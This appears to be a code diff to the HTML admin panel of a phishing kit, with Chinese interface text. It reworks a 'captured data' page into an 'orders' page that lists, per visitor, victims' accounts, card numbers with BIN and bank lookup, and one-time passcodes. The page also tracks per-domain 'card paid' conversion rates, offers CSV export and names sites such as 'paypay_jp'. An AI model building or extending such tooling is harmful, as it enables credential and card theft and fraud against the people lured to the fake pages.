@@ -41,7 +41,7 @@
         <button data-page="dashboard" class="active"><span class="nav-icon">⌂</span>仪表板</button>
         <p>数据</p>
         <button data-page="data"><span class="nav-icon">≡</span>数据中心</button>
-        <button data-page="captures"><span class="nav-icon">✎</span>采集数据</button>
+        <button data-page="orders"><span class="nav-icon">✎</span>订单数据</button>
         <button data-page="blacklist"><span class="nav-icon">⛔</span>黑名单中心</button>
         <p>管理</p>
         <button data-page="frontend"><span class="nav-icon">◇</span>前台配置</button>
@@ -95,20 +95,28 @@
         </section>
       </div>
 
-      <div class="page" data-page-view="captures">
-        <div class="page-intro"><div><h3>采集数据</h3><p>前台页面提交的表单字段，连同域名、页面、IP、UA、时区一起入库；可按域名或关键字查询并导出 CSV。</p></div></div>
+      <div class="page" data-page-view="orders">
+        <div class="page-intro"><div><h3>订单数据</h3><p>按访客（uuid）归并的多步提交：站点、域名、账号、卡号与 BIN 识别、OTP，可筛选并导出。</p></div></div>
         <section class="content-block">
-          <form id="capFilters" class="filterbar">
-            <label>域名<input name="domain" placeholder="example.com"></label>
-            <label>搜索（字段 / IP / UA）<input name="q" placeholder="关键字"></label>
+          <div class="block-heading"><div><h3>站点统计</h3><p>按域名汇总访问 / 提交 / 付卡与转化率。</p></div></div>
+          <div class="table-wrap">
+            <table><thead><tr><th>域名</th><th>站点</th><th>访问</th><th>提交</th><th>付卡</th><th>转化率</th></tr></thead><tbody id="orderStatsBody"></tbody></table>
+          </div>
+        </section>
+        <section class="content-block">
+          <form id="orderFilters" class="filterbar">
+            <label>站点<input name="site" placeholder="如 paypay_jp"></label>
+            <label>域名<input name="referer" placeholder="example.com"></label>
+            <label>关键字<input name="keyword" placeholder="卡号 / IP / 账号"></label>
+            <label>状态<select name="status"><option value="">全部</option><option value="1">已提交</option><option value="2">已付卡</option><option value="0">未提交</option></select></label>
             <button class="primary" type="submit">查询</button>
-            <button class="secondary" type="button" id="capExport">⬇ 导出 CSV</button>
-            <button class="danger-link" type="button" id="capClear" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 清空采集</button>
+            <button class="secondary" type="button" id="orderExport">⬇ 导出 CSV</button>
+            <button class="danger-link" type="button" id="orderClear" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 清空数据</button>
           </form>
           <div class="table-wrap">
-            <table><thead><tr><th>编号</th><th>时间</th><th>域名</th><th>页面</th><th>客户端</th><th>IP</th><th>提交字段</th><th>UA</th></tr></thead><tbody id="capBody"></tbody></table>
+            <table><thead><tr><th>编号</th><th>时间</th><th>站点</th><th>域名</th><th>账号</th><th>卡号</th><th>品牌 / 银行</th><th>OTP</th><th>状态</th><th>IP</th><th>明细</th></tr></thead><tbody id="orderBody"></tbody></table>
           </div>
-          <div class="table-foot"><span id="capCount">共 0 条</span><button id="capPrev" class="secondary small">上一页</button><span id="capPage">1</span><button id="capNext" class="secondary small">下一页</button></div>
+          <div class="table-foot"><span id="orderCount">共 0 条</span><button id="orderPrev" class="secondary small">上一页</button><span id="orderPage">1</span><button id="orderNext" class="secondary small">下一页</button></div>
         </section>
       </div>
 
